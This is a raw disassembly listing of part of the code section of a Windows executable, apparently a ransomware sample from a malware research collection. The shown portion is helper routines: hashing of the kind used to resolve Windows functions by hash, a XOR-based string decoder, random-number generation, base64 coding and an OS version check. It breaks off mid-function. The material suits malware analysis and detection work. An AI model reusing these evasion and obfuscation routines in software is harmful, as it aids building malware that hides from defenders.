
malware_samples/ransomware/374f9df39b92ccccae8a9b747e606aebe0ddaf117f8f6450052efb5160c99368.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	cc                   	int3
  401001:	cc                   	int3
  401002:	cc                   	int3
  401003:	cc                   	int3
  401004:	cc                   	int3
  401005:	cc                   	int3
  401006:	cc                   	int3
  401007:	cc                   	int3
  401008:	cc                   	int3
  401009:	cc                   	int3
  40100a:	cc                   	int3
  40100b:	cc                   	int3
  40100c:	cc                   	int3
  40100d:	cc                   	int3
  40100e:	cc                   	int3
  40100f:	cc                   	int3
  401010:	cc                   	int3
  401011:	cc                   	int3
  401012:	cc                   	int3
  401013:	cc                   	int3
  401014:	cc                   	int3
  401015:	cc                   	int3
  401016:	cc                   	int3
  401017:	cc                   	int3
  401018:	cc                   	int3
  401019:	cc                   	int3
  40101a:	cc                   	int3
  40101b:	cc                   	int3
  40101c:	cc                   	int3
  40101d:	cc                   	int3
  40101e:	cc                   	int3
  40101f:	cc                   	int3
  401020:	c7                   	(bad)
  401021:	bf 03 49 55 8b       	mov    $0x8b554903,%edi
  401026:	ec                   	in     (%dx),%al
  401027:	51                   	push   %ecx
  401028:	53                   	push   %ebx
  401029:	8b 45 0c             	mov    0xc(%ebp),%eax
  40102c:	8b 4d 14             	mov    0x14(%ebp),%ecx
  40102f:	0b c8                	or     %eax,%ecx
  401031:	8b 4d 10             	mov    0x10(%ebp),%ecx
  401034:	75 0b                	jne    0x401041
  401036:	8b 45 08             	mov    0x8(%ebp),%eax
  401039:	f7 e1                	mul    %ecx
  40103b:	5b                   	pop    %ebx
  40103c:	59                   	pop    %ecx
  40103d:	5d                   	pop    %ebp
  40103e:	c2 10 00             	ret    $0x10
  401041:	f7 e1                	mul    %ecx
  401043:	8b d8                	mov    %eax,%ebx
  401045:	8b 45 08             	mov    0x8(%ebp),%eax
  401048:	f7 65 14             	mull   0x14(%ebp)
  40104b:	03 d8                	add    %eax,%ebx
  40104d:	8b 45 08             	mov    0x8(%ebp),%eax
  401050:	f7 e1                	mul    %ecx
  401052:	03 d3                	add    %ebx,%edx
  401054:	5b                   	pop    %ebx
  401055:	59                   	pop    %ecx
  401056:	5d                   	pop    %ebp
  401057:	c2 10 00             	ret    $0x10
  40105a:	8b ff                	mov    %edi,%edi
  40105c:	80 f9 40             	cmp    $0x40,%cl
  40105f:	73 15                	jae    0x401076
  401061:	80 f9 20             	cmp    $0x20,%cl
  401064:	73 06                	jae    0x40106c
  401066:	0f a5 c2             	shld   %cl,%eax,%edx
  401069:	d3 e0                	shl    %cl,%eax
  40106b:	c3                   	ret
  40106c:	8b d0                	mov    %eax,%edx
  40106e:	33 c0                	xor    %eax,%eax
  401070:	80 e1 1f             	and    $0x1f,%cl
  401073:	d3 e2                	shl    %cl,%edx
  401075:	c3                   	ret
  401076:	33 c0                	xor    %eax,%eax
  401078:	33 d2                	xor    %edx,%edx
  40107a:	c3                   	ret
  40107b:	90                   	nop
  40107c:	55                   	push   %ebp
  40107d:	8b ec                	mov    %esp,%ebp
  40107f:	56                   	push   %esi
  401080:	57                   	push   %edi
  401081:	8b 4d 10             	mov    0x10(%ebp),%ecx
  401084:	8b 75 0c             	mov    0xc(%ebp),%esi
  401087:	8b 7d 08             	mov    0x8(%ebp),%edi
  40108a:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  40108c:	5f                   	pop    %edi
  40108d:	5e                   	pop    %esi
  40108e:	5d                   	pop    %ebp
  40108f:	c2 0c 00             	ret    $0xc
  401092:	8b ff                	mov    %edi,%edi
  401094:	55                   	push   %ebp
  401095:	8b ec                	mov    %esp,%ebp
  401097:	57                   	push   %edi
  401098:	0f b6 45 0c          	movzbl 0xc(%ebp),%eax
  40109c:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40109f:	8b 7d 08             	mov    0x8(%ebp),%edi
  4010a2:	f3 aa                	rep stos %al,%es:(%edi)
  4010a4:	5f                   	pop    %edi
  4010a5:	5d                   	pop    %ebp
  4010a6:	c2 0c 00             	ret    $0xc
  4010a9:	8d 40 00             	lea    0x0(%eax),%eax
  4010ac:	33 c0                	xor    %eax,%eax
  4010ae:	66 0f 1f 84 00 00 00 	nopw   0x0(%eax,%eax,1)
  4010b5:	00 00 
  4010b7:	40                   	inc    %eax
  4010b8:	0f 1f 80 00 00 00 00 	nopl   0x0(%eax)
  4010bf:	c1 e0 06             	shl    $0x6,%eax
  4010c2:	0f 1f 84 00 00 00 00 	nopl   0x0(%eax,%eax,1)
  4010c9:	00 
  4010ca:	8d 40 f0             	lea    -0x10(%eax),%eax
  4010cd:	90                   	nop
  4010ce:	64 8b 00             	mov    %fs:(%eax),%eax
  4010d1:	66 90                	xchg   %ax,%ax
  4010d3:	c3                   	ret
  4010d4:	53                   	push   %ebx
  4010d5:	51                   	push   %ecx
  4010d6:	6a 01                	push   $0x1
  4010d8:	58                   	pop    %eax
  4010d9:	0f a2                	cpuid
  4010db:	f7 c1 00 00 00 40    	test   $0x40000000,%ecx
  4010e1:	0f 95 c0             	setne  %al
  4010e4:	84 c0                	test   %al,%al
  4010e6:	74 09                	je     0x4010f1
  4010e8:	0f c7 f0             	rdrand %eax
  4010eb:	0f c7 f2             	rdrand %edx
  4010ee:	59                   	pop    %ecx
  4010ef:	5b                   	pop    %ebx
  4010f0:	c3                   	ret
  4010f1:	6a 07                	push   $0x7
  4010f3:	58                   	pop    %eax
  4010f4:	33 c9                	xor    %ecx,%ecx
  4010f6:	0f a2                	cpuid
  4010f8:	f7 c3 00 00 04 00    	test   $0x40000,%ebx
  4010fe:	0f 95 c0             	setne  %al
  401101:	84 c0                	test   %al,%al
  401103:	74 09                	je     0x40110e
  401105:	0f c7 f8             	rdseed %eax
  401108:	0f c7 fa             	rdseed %edx
  40110b:	59                   	pop    %ecx
  40110c:	5b                   	pop    %ebx
  40110d:	c3                   	ret
  40110e:	0f 31                	rdtsc
  401110:	8b c8                	mov    %eax,%ecx
  401112:	c1 c9 0d             	ror    $0xd,%ecx
  401115:	0f 31                	rdtsc
  401117:	8b d0                	mov    %eax,%edx
  401119:	c1 c2 0d             	rol    $0xd,%edx
  40111c:	8b c1                	mov    %ecx,%eax
  40111e:	59                   	pop    %ecx
  40111f:	5b                   	pop    %ebx
  401120:	c3                   	ret
  401121:	8d 40 00             	lea    0x0(%eax),%eax
  401124:	55                   	push   %ebp
  401125:	8b ec                	mov    %esp,%ebp
  401127:	51                   	push   %ecx
  401128:	52                   	push   %edx
  401129:	e8 a6 ff ff ff       	call   0x4010d4
  40112e:	90                   	nop
  40112f:	b9 0d 66 19 00       	mov    $0x19660d,%ecx
  401134:	66 0f 1f 84 00 00 00 	nopw   0x0(%eax,%eax,1)
  40113b:	00 00 
  40113d:	f7 e1                	mul    %ecx
  40113f:	0f 1f 44 00 00       	nopl   0x0(%eax,%eax,1)
  401144:	05 5f f3 6e 3c       	add    $0x3c6ef35f,%eax
  401149:	0f 1f 80 00 00 00 00 	nopl   0x0(%eax)
  401150:	25 ff ff ff 07       	and    $0x7ffffff,%eax
  401155:	0f 1f 84 00 00 00 00 	nopl   0x0(%eax,%eax,1)
  40115c:	00 
  40115d:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  401160:	66 0f 1f 84 00 00 00 	nopw   0x0(%eax,%eax,1)
  401167:	00 00 
  401169:	41                   	inc    %ecx
  40116a:	90                   	nop
  40116b:	33 d2                	xor    %edx,%edx
  40116d:	66 90                	xchg   %ax,%ax
  40116f:	f7 f1                	div    %ecx
  401171:	66 90                	xchg   %ax,%ax
  401173:	92                   	xchg   %eax,%edx
  401174:	0f 1f 84 00 00 00 00 	nopl   0x0(%eax,%eax,1)
  40117b:	00 
  40117c:	3b 45 08             	cmp    0x8(%ebp),%eax
  40117f:	72 0b                	jb     0x40118c
  401181:	3b 45 0c             	cmp    0xc(%ebp),%eax
  401184:	77 06                	ja     0x40118c
  401186:	5a                   	pop    %edx
  401187:	59                   	pop    %ecx
  401188:	5d                   	pop    %ebp
  401189:	c2 08 00             	ret    $0x8
  40118c:	eb 9b                	jmp    0x401129
  40118e:	8b ff                	mov    %edi,%edi
  401190:	55                   	push   %ebp
  401191:	8b ec                	mov    %esp,%ebp
  401193:	51                   	push   %ecx
  401194:	52                   	push   %edx
  401195:	56                   	push   %esi
  401196:	33 c0                	xor    %eax,%eax
  401198:	8b 55 0c             	mov    0xc(%ebp),%edx
  40119b:	8b 75 08             	mov    0x8(%ebp),%esi
  40119e:	ac                   	lods   %ds:(%esi),%al
  40119f:	33 c9                	xor    %ecx,%ecx
  4011a1:	b9 30 00 00 00       	mov    $0x30,%ecx
  4011a6:	8d 0c 4d 01 00 00 00 	lea    0x1(,%ecx,2),%ecx
  4011ad:	02 f1                	add    %cl,%dh
  4011af:	2a f1                	sub    %cl,%dh
  4011b1:	33 c9                	xor    %ecx,%ecx
  4011b3:	b9 06 00 00 00       	mov    $0x6,%ecx
  4011b8:	8d 0c 4d 01 00 00 00 	lea    0x1(,%ecx,2),%ecx
  4011bf:	d3 ca                	ror    %cl,%edx
  4011c1:	03 d0                	add    %eax,%edx
  4011c3:	90                   	nop
  4011c4:	85 c0                	test   %eax,%eax
  4011c6:	75 d6                	jne    0x40119e
  4011c8:	8b c2                	mov    %edx,%eax
  4011ca:	5e                   	pop    %esi
  4011cb:	5a                   	pop    %edx
  4011cc:	59                   	pop    %ecx
  4011cd:	5d                   	pop    %ebp
  4011ce:	c2 08 00             	ret    $0x8
  4011d1:	8d 40 00             	lea    0x0(%eax),%eax
  4011d4:	55                   	push   %ebp
  4011d5:	8b ec                	mov    %esp,%ebp
  4011d7:	51                   	push   %ecx
  4011d8:	52                   	push   %edx
  4011d9:	56                   	push   %esi
  4011da:	33 c0                	xor    %eax,%eax
  4011dc:	8b 55 0c             	mov    0xc(%ebp),%edx
  4011df:	8b 75 08             	mov    0x8(%ebp),%esi
  4011e2:	66 ad                	lods   %ds:(%esi),%ax
  4011e4:	90                   	nop
  4011e5:	66 83 f8 41          	cmp    $0x41,%ax
  4011e9:	72 0b                	jb     0x4011f6
  4011eb:	66 83 f8 5a          	cmp    $0x5a,%ax
  4011ef:	77 05                	ja     0x4011f6
  4011f1:	66 83 c8 20          	or     $0x20,%ax
  4011f5:	90                   	nop
  4011f6:	33 c9                	xor    %ecx,%ecx
  4011f8:	b9 30 00 00 00       	mov    $0x30,%ecx
  4011fd:	8d 0c 4d 01 00 00 00 	lea    0x1(,%ecx,2),%ecx
  401204:	02 f1                	add    %cl,%dh
  401206:	2a f1                	sub    %cl,%dh
  401208:	33 c9                	xor    %ecx,%ecx
  40120a:	b9 06 00 00 00       	mov    $0x6,%ecx
  40120f:	8d 0c 4d 01 00 00 00 	lea    0x1(,%ecx,2),%ecx
  401216:	d3 ca                	ror    %cl,%edx
  401218:	03 d0                	add    %eax,%edx
  40121a:	90                   	nop
  40121b:	85 c0                	test   %eax,%eax
  40121d:	75 c3                	jne    0x4011e2
  40121f:	8b c2                	mov    %edx,%eax
  401221:	5e                   	pop    %esi
  401222:	5a                   	pop    %edx
  401223:	59                   	pop    %ecx
  401224:	5d                   	pop    %ebp
  401225:	c2 08 00             	ret    $0x8
  401228:	55                   	push   %ebp
  401229:	8b ec                	mov    %esp,%ebp
  40122b:	53                   	push   %ebx
  40122c:	56                   	push   %esi
  40122d:	57                   	push   %edi
  40122e:	33 db                	xor    %ebx,%ebx
  401230:	8b 75 08             	mov    0x8(%ebp),%esi
  401233:	8b 7d 0c             	mov    0xc(%ebp),%edi
  401236:	66 ad                	lods   %ds:(%esi),%ax
  401238:	66 85 c0             	test   %ax,%ax
  40123b:	75 03                	jne    0x401240
  40123d:	aa                   	stos   %al,%es:(%edi)
  40123e:	eb 04                	jmp    0x401244
  401240:	aa                   	stos   %al,%es:(%edi)
  401241:	43                   	inc    %ebx
  401242:	eb f2                	jmp    0x401236
  401244:	8b c3                	mov    %ebx,%eax
  401246:	5f                   	pop    %edi
  401247:	5e                   	pop    %esi
  401248:	5b                   	pop    %ebx
  401249:	5d                   	pop    %ebp
  40124a:	c2 08 00             	ret    $0x8
  40124d:	8d 40 00             	lea    0x0(%eax),%eax
  401250:	55                   	push   %ebp
  401251:	8b ec                	mov    %esp,%ebp
  401253:	51                   	push   %ecx
  401254:	52                   	push   %edx
  401255:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401258:	8b 55 0c             	mov    0xc(%ebp),%edx
  40125b:	90                   	nop
  40125c:	81 31 c7 bf 03 48    	xorl   $0x4803bfc7,(%ecx)
  401262:	f7 11                	notl   (%ecx)
  401264:	90                   	nop
  401265:	83 c1 04             	add    $0x4,%ecx
  401268:	4a                   	dec    %edx
  401269:	75 f1                	jne    0x40125c
  40126b:	5a                   	pop    %edx
  40126c:	59                   	pop    %ecx
  40126d:	5d                   	pop    %ebp
  40126e:	c2 08 00             	ret    $0x8
  401271:	8d 40 00             	lea    0x0(%eax),%eax
  401274:	55                   	push   %ebp
  401275:	8b ec                	mov    %esp,%ebp
  401277:	53                   	push   %ebx
  401278:	56                   	push   %esi
  401279:	57                   	push   %edi
  40127a:	8b 45 10             	mov    0x10(%ebp),%eax
  40127d:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  401280:	8b 5d 10             	mov    0x10(%ebp),%ebx
  401283:	25 ff ff 00 00       	and    $0xffff,%eax
  401288:	c1 eb 10             	shr    $0x10,%ebx
  40128b:	8b 75 08             	mov    0x8(%ebp),%esi
  40128e:	85 c9                	test   %ecx,%ecx
  401290:	eb 48                	jmp    0x4012da
  401292:	bf 66 b0 03 48       	mov    $0x4803b066,%edi
  401297:	81 f7 c7 bf 03 48    	xor    $0x4803bfc7,%edi
  40129d:	3b cf                	cmp    %edi,%ecx
  40129f:	73 04                	jae    0x4012a5
  4012a1:	90                   	nop
  4012a2:	8b f9                	mov    %ecx,%edi
  4012a4:	90                   	nop
  4012a5:	2b cf                	sub    %edi,%ecx
  4012a7:	90                   	nop
  4012a8:	0f b6 16             	movzbl (%esi),%edx
  4012ab:	90                   	nop
  4012ac:	03 c2                	add    %edx,%eax
  4012ae:	46                   	inc    %esi
  4012af:	03 d8                	add    %eax,%ebx
  4012b1:	90                   	nop
  4012b2:	4f                   	dec    %edi
  4012b3:	90                   	nop
  4012b4:	75 f2                	jne    0x4012a8
  4012b6:	90                   	nop
  4012b7:	bf c8 bf 02 48       	mov    $0x4802bfc8,%edi
  4012bc:	81 f7 c7 bf 03 48    	xor    $0x4803bfc7,%edi
  4012c2:	33 d2                	xor    %edx,%edx
  4012c4:	90                   	nop
  4012c5:	f7 f7                	div    %edi
  4012c7:	90                   	nop
  4012c8:	52                   	push   %edx
  4012c9:	90                   	nop
  4012ca:	8b c3                	mov    %ebx,%eax
  4012cc:	90                   	nop
  4012cd:	33 d2                	xor    %edx,%edx
  4012cf:	90                   	nop
  4012d0:	f7 f7                	div    %edi
  4012d2:	90                   	nop
  4012d3:	8b da                	mov    %edx,%ebx
  4012d5:	90                   	nop
  4012d6:	58                   	pop    %eax
  4012d7:	90                   	nop
  4012d8:	85 c9                	test   %ecx,%ecx
  4012da:	75 b6                	jne    0x401292
  4012dc:	c1 e3 10             	shl    $0x10,%ebx
  4012df:	03 c3                	add    %ebx,%eax
  4012e1:	8d 0d 70 4f 42 00    	lea    0x424f70,%ecx
  4012e7:	8b 09                	mov    (%ecx),%ecx
  4012e9:	33 c1                	xor    %ecx,%eax
  4012eb:	5f                   	pop    %edi
  4012ec:	5e                   	pop    %esi
  4012ed:	5b                   	pop    %ebx
  4012ee:	5d                   	pop    %ebp
  4012ef:	c2 0c 00             	ret    $0xc
  4012f2:	8b ff                	mov    %edi,%edi
  4012f4:	55                   	push   %ebp
  4012f5:	8b ec                	mov    %esp,%ebp
  4012f7:	81 ec 04 01 00 00    	sub    $0x104,%esp
  4012fd:	53                   	push   %ebx
  4012fe:	51                   	push   %ecx
  4012ff:	52                   	push   %edx
  401300:	56                   	push   %esi
  401301:	57                   	push   %edi
  401302:	8d bd fc fe ff ff    	lea    -0x104(%ebp),%edi
  401308:	32 c0                	xor    %al,%al
  40130a:	aa                   	stos   %al,%es:(%edi)
  40130b:	b9 2a 00 00 00       	mov    $0x2a,%ecx
  401310:	b0 ff                	mov    $0xff,%al
  401312:	f3 aa                	rep stos %al,%es:(%edi)
  401314:	b0 3e                	mov    $0x3e,%al
  401316:	aa                   	stos   %al,%es:(%edi)
  401317:	b9 03 00 00 00       	mov    $0x3,%ecx
  40131c:	b0 ff                	mov    $0xff,%al
  40131e:	f3 aa                	rep stos %al,%es:(%edi)
  401320:	b0 3f                	mov    $0x3f,%al
  401322:	aa                   	stos   %al,%es:(%edi)
  401323:	b9 0a 00 00 00       	mov    $0xa,%ecx
  401328:	b0 34                	mov    $0x34,%al
  40132a:	aa                   	stos   %al,%es:(%edi)
  40132b:	fe c0                	inc    %al
  40132d:	e2 fb                	loop   0x40132a
  40132f:	b9 03 00 00 00       	mov    $0x3,%ecx
  401334:	b0 ff                	mov    $0xff,%al
  401336:	f3 aa                	rep stos %al,%es:(%edi)
  401338:	32 c0                	xor    %al,%al
  40133a:	aa                   	stos   %al,%es:(%edi)
  40133b:	b9 03 00 00 00       	mov    $0x3,%ecx
  401340:	b0 ff                	mov    $0xff,%al
  401342:	f3 aa                	rep stos %al,%es:(%edi)
  401344:	b9 1a 00 00 00       	mov    $0x1a,%ecx
  401349:	32 c0                	xor    %al,%al
  40134b:	aa                   	stos   %al,%es:(%edi)
  40134c:	fe c0                	inc    %al
  40134e:	e2 fb                	loop   0x40134b
  401350:	8a d0                	mov    %al,%dl
  401352:	b9 06 00 00 00       	mov    $0x6,%ecx
  401357:	b0 ff                	mov    $0xff,%al
  401359:	f3 aa                	rep stos %al,%es:(%edi)
  40135b:	b9 1a 00 00 00       	mov    $0x1a,%ecx
  401360:	8a c2                	mov    %dl,%al
  401362:	aa                   	stos   %al,%es:(%edi)
  401363:	fe c0                	inc    %al
  401365:	e2 fb                	loop   0x401362
  401367:	b9 85 00 00 00       	mov    $0x85,%ecx
  40136c:	b0 ff                	mov    $0xff,%al
  40136e:	f3 aa                	rep stos %al,%es:(%edi)
  401370:	8b 7d 08             	mov    0x8(%ebp),%edi
  401373:	33 c0                	xor    %eax,%eax
  401375:	8b f7                	mov    %edi,%esi
  401377:	8a 07                	mov    (%edi),%al
  401379:	83 c7 04             	add    $0x4,%edi
  40137c:	84 c0                	test   %al,%al
  40137e:	75 f7                	jne    0x401377
  401380:	8d 5f fc             	lea    -0x4(%edi),%ebx
  401383:	b8 3d 00 00 00       	mov    $0x3d,%eax
  401388:	2b de                	sub    %esi,%ebx
  40138a:	74 7d                	je     0x401409
  40138c:	3a 44 1e ff          	cmp    -0x1(%esi,%ebx,1),%al
  401390:	0f 94 c2             	sete   %dl
  401393:	75 04                	jne    0x401399
  401395:	88 64 1e ff          	mov    %ah,-0x1(%esi,%ebx,1)
  401399:	3a 44 1e fe          	cmp    -0x2(%esi,%ebx,1),%al
  40139d:	0f 94 c0             	sete   %al
  4013a0:	75 04                	jne    0x4013a6
  4013a2:	88 64 1e fe          	mov    %ah,-0x2(%esi,%ebx,1)
  4013a6:	02 c2                	add    %dl,%al
  4013a8:	8b 7d 0c             	mov    0xc(%ebp),%edi
  4013ab:	c1 eb 02             	shr    $0x2,%ebx
  4013ae:	8d 14 5b             	lea    (%ebx,%ebx,2),%edx
  4013b1:	2b d0                	sub    %eax,%edx
  4013b3:	52                   	push   %edx
  4013b4:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  4013b7:	8b 0e                	mov    (%esi),%ecx
  4013b9:	0f b6 d1             	movzbl %cl,%edx
  4013bc:	0f b6 dd             	movzbl %ch,%ebx
  4013bf:	57                   	push   %edi
  4013c0:	8d bd fc fe ff ff    	lea    -0x104(%ebp),%edi
  4013c6:	8a 04 3a             	mov    (%edx,%edi,1),%al
  4013c9:	8a 24 3b             	mov    (%ebx,%edi,1),%ah
  4013cc:	c1 e9 10             	shr    $0x10,%ecx
  4013cf:	83 c6 04             	add    $0x4,%esi
  4013d2:	0f b6 d1             	movzbl %cl,%edx
  4013d5:	0f b6 cd             	movzbl %ch,%ecx
  4013d8:	8a 1c 3a             	mov    (%edx,%edi,1),%bl
  4013db:	8a 3c 39             	mov    (%ecx,%edi,1),%bh
  4013de:	5f                   	pop    %edi
  4013df:	8a d4                	mov    %ah,%dl
  4013e1:	8a f3                	mov    %bl,%dh
  4013e3:	c0 e0 02             	shl    $0x2,%al
  4013e6:	c0 eb 02             	shr    $0x2,%bl
  4013e9:	c0 e6 06             	shl    $0x6,%dh
  4013ec:	c0 e4 04             	shl    $0x4,%ah
  4013ef:	c0 ea 04             	shr    $0x4,%dl
  4013f2:	0a fe                	or     %dh,%bh
  4013f4:	0a c2                	or     %dl,%al
  4013f6:	0a e3                	or     %bl,%ah
  4013f8:	88 07                	mov    %al,(%edi)
  4013fa:	88 7f 02             	mov    %bh,0x2(%edi)
  4013fd:	88 67 01             	mov    %ah,0x1(%edi)
  401400:	ff 4d fc             	decl   -0x4(%ebp)
  401403:	8d 7f 03             	lea    0x3(%edi),%edi
  401406:	75 af                	jne    0x4013b7
  401408:	58                   	pop    %eax
  401409:	5f                   	pop    %edi
  40140a:	5e                   	pop    %esi
  40140b:	5a                   	pop    %edx
  40140c:	59                   	pop    %ecx
  40140d:	5b                   	pop    %ebx
  40140e:	8b e5                	mov    %ebp,%esp
  401410:	5d                   	pop    %ebp
  401411:	c2 08 00             	ret    $0x8
  401414:	55                   	push   %ebp
  401415:	8b ec                	mov    %esp,%ebp
  401417:	83 c4 bc             	add    $0xffffffbc,%esp
  40141a:	53                   	push   %ebx
  40141b:	51                   	push   %ecx
  40141c:	52                   	push   %edx
  40141d:	56                   	push   %esi
  40141e:	57                   	push   %edi
  40141f:	8d 7d bc             	lea    -0x44(%ebp),%edi
  401422:	b8 41 42 43 44       	mov    $0x44434241,%eax
  401427:	ab                   	stos   %eax,%es:(%edi)
  401428:	b8 45 46 47 48       	mov    $0x48474645,%eax
  40142d:	ab                   	stos   %eax,%es:(%edi)
  40142e:	b8 49 4a 4b 4c       	mov    $0x4c4b4a49,%eax
  401433:	ab                   	stos   %eax,%es:(%edi)
  401434:	b8 4d 4e 4f 50       	mov    $0x504f4e4d,%eax
  401439:	ab                   	stos   %eax,%es:(%edi)
  40143a:	b8 51 52 53 54       	mov    $0x54535251,%eax
  40143f:	ab                   	stos   %eax,%es:(%edi)
  401440:	b8 55 56 57 58       	mov    $0x58575655,%eax
  401445:	ab                   	stos   %eax,%es:(%edi)
  401446:	b8 59 5a 61 62       	mov    $0x62615a59,%eax
  40144b:	ab                   	stos   %eax,%es:(%edi)
  40144c:	b8 63 64 65 66       	mov    $0x66656463,%eax
  401451:	ab                   	stos   %eax,%es:(%edi)
  401452:	b8 67 68 69 6a       	mov    $0x6a696867,%eax
  401457:	ab                   	stos   %eax,%es:(%edi)
  401458:	b8 6b 6c 6d 6e       	mov    $0x6e6d6c6b,%eax
  40145d:	ab                   	stos   %eax,%es:(%edi)
  40145e:	b8 6f 70 71 72       	mov    $0x7271706f,%eax
  401463:	ab                   	stos   %eax,%es:(%edi)
  401464:	b8 73 74 75 76       	mov    $0x76757473,%eax
  401469:	ab                   	stos   %eax,%es:(%edi)
  40146a:	b8 77 78 79 7a       	mov    $0x7a797877,%eax
  40146f:	ab                   	stos   %eax,%es:(%edi)
  401470:	b8 30 31 32 33       	mov    $0x33323130,%eax
  401475:	ab                   	stos   %eax,%es:(%edi)
  401476:	b8 34 35 36 37       	mov    $0x37363534,%eax
  40147b:	ab                   	stos   %eax,%es:(%edi)
  40147c:	b8 38 39 2b 2f       	mov    $0x2f2b3938,%eax
  401481:	ab                   	stos   %eax,%es:(%edi)
  401482:	8b 75 08             	mov    0x8(%ebp),%esi
  401485:	8b 45 0c             	mov    0xc(%ebp),%eax
  401488:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40148b:	8b 7d 10             	mov    0x10(%ebp),%edi
  40148e:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  401492:	75 02                	jne    0x401496
  401494:	eb 5b                	jmp    0x4014f1
  401496:	8a 06                	mov    (%esi),%al
  401498:	8a 56 01             	mov    0x1(%esi),%dl
  40149b:	8a 5e 02             	mov    0x2(%esi),%bl
  40149e:	8a e0                	mov    %al,%ah
  4014a0:	8a f2                	mov    %dl,%dh
  4014a2:	8a fb                	mov    %bl,%bh
  4014a4:	80 e4 03             	and    $0x3,%ah
  4014a7:	80 e6 0f             	and    $0xf,%dh
  4014aa:	80 e7 3f             	and    $0x3f,%bh
  4014ad:	c0 e8 02             	shr    $0x2,%al
  4014b0:	c0 ea 04             	shr    $0x4,%dl
  4014b3:	c0 eb 06             	shr    $0x6,%bl
  4014b6:	c0 e4 04             	shl    $0x4,%ah
  4014b9:	c0 e6 02             	shl    $0x2,%dh
  4014bc:	0a e2                	or     %dl,%ah
  4014be:	0a de                	or     %dh,%bl
  4014c0:	0f b6 d0             	movzbl %al,%edx
  4014c3:	0f b6 cc             	movzbl %ah,%ecx
  4014c6:	56                   	push   %esi
  4014c7:	8d 75 bc             	lea    -0x44(%ebp),%esi
  4014ca:	8a 04 32             	mov    (%edx,%esi,1),%al
  4014cd:	8a 24 31             	mov    (%ecx,%esi,1),%ah
  4014d0:	0f b6 d3             	movzbl %bl,%edx
  4014d3:	0f b6 cf             	movzbl %bh,%ecx
  4014d6:	8a 1c 32             	mov    (%edx,%esi,1),%bl
  4014d9:	8a 3c 31             	mov    (%ecx,%esi,1),%bh
  4014dc:	5e                   	pop    %esi
  4014dd:	25 ff ff 00 00       	and    $0xffff,%eax
  4014e2:	c1 e3 10             	shl    $0x10,%ebx
  4014e5:	83 c6 03             	add    $0x3,%esi
  4014e8:	0b c3                	or     %ebx,%eax
  4014ea:	ab                   	stos   %eax,%es:(%edi)
  4014eb:	83 6d fc 03          	subl   $0x3,-0x4(%ebp)
  4014ef:	79 9d                	jns    0x40148e
  4014f1:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  4014f5:	74 0c                	je     0x401503
  4014f7:	03 7d fc             	add    -0x4(%ebp),%edi
  4014fa:	c6 07 3d             	movb   $0x3d,(%edi)
  4014fd:	47                   	inc    %edi
  4014fe:	ff 45 fc             	incl   -0x4(%ebp)
  401501:	75 f7                	jne    0x4014fa
  401503:	8b c7                	mov    %edi,%eax
  401505:	66 c7 00 00 00       	movw   $0x0,(%eax)
  40150a:	2b 45 10             	sub    0x10(%ebp),%eax
  40150d:	5f                   	pop    %edi
  40150e:	5e                   	pop    %esi
  40150f:	5a                   	pop    %edx
  401510:	59                   	pop    %ecx
  401511:	5b                   	pop    %ebx
  401512:	8b e5                	mov    %ebp,%esp
  401514:	5d                   	pop    %ebp
  401515:	c2 0c 00             	ret    $0xc
  401518:	55                   	push   %ebp
  401519:	8b ec                	mov    %esp,%ebp
  40151b:	53                   	push   %ebx
  40151c:	56                   	push   %esi
  40151d:	57                   	push   %edi
  40151e:	33 ff                	xor    %edi,%edi
  401520:	8b 75 08             	mov    0x8(%ebp),%esi
  401523:	33 db                	xor    %ebx,%ebx
  401525:	eb 01                	jmp    0x401528
  401527:	43                   	inc    %ebx
  401528:	80 3c 1e 00          	cmpb   $0x0,(%esi,%ebx,1)
  40152c:	75 f9                	jne    0x401527
  40152e:	85 db                	test   %ebx,%ebx
  401530:	74 21                	je     0x401553
  401532:	80 7c 1e ff 3d       	cmpb   $0x3d,-0x1(%esi,%ebx,1)
  401537:	75 0e                	jne    0x401547
  401539:	80 7c 1e fe 3d       	cmpb   $0x3d,-0x2(%esi,%ebx,1)
  40153e:	75 07                	jne    0x401547
  401540:	bf 02 00 00 00       	mov    $0x2,%edi
  401545:	eb 0c                	jmp    0x401553
  401547:	80 7c 1e ff 3d       	cmpb   $0x3d,-0x1(%esi,%ebx,1)
  40154c:	75 05                	jne    0x401553
  40154e:	bf 01 00 00 00       	mov    $0x1,%edi
  401553:	8d 1c 5b             	lea    (%ebx,%ebx,2),%ebx
  401556:	c1 eb 02             	shr    $0x2,%ebx
  401559:	2b df                	sub    %edi,%ebx
  40155b:	8b c3                	mov    %ebx,%eax
  40155d:	5f                   	pop    %edi
  40155e:	5e                   	pop    %esi
  40155f:	5b                   	pop    %ebx
  401560:	5d                   	pop    %ebp
  401561:	c2 04 00             	ret    $0x4
  401564:	e8 43 fb ff ff       	call   0x4010ac
  401569:	8b 40 64             	mov    0x64(%eax),%eax
  40156c:	b8 01 00 00 00       	mov    $0x1,%eax
  401571:	c3                   	ret
  401572:	8b ff                	mov    %edi,%edi
  401574:	56                   	push   %esi
  401575:	57                   	push   %edi
  401576:	e8 31 fb ff ff       	call   0x4010ac
  40157b:	8b b0 a4 00 00 00    	mov    0xa4(%eax),%esi
  401581:	8b b8 a8 00 00 00    	mov    0xa8(%eax),%edi
  401587:	83 fe 05             	cmp    $0x5,%esi
  40158a:	75 05                	jne    0x401591
  40158c:	83 ff 01             	cmp    $0x1,%edi
  40158f:	72 05                	jb     0x401596
  401591:	83 fe 05             	cmp    $0x5,%esi
  401594:	73 0d                	jae    0x4015a3
  401596:	b8 00 00 00 00       	mov    $0x0,%eax
  40159b:	5f                   	pop    %edi
  40159c:	5e                   	pop    %esi
  40159d:	c3                   	ret
  40159e:	e9 a4 00 00 00       	jmp    0x401647
  4015a3:	83 fe 05             	cmp    $0x5,%esi
  4015a6:	75 12                	jne    0x4015ba
  4015a8:	83 ff 01             	cmp    $0x1,%edi
  4015ab:	75 0d                	jne    0x4015ba
  4015ad:	b8 33 00 00 00       	mov    $0x33,%eax
  4015b2:	5f                   	pop    %edi
  4015b3:	5e                   	pop    %esi
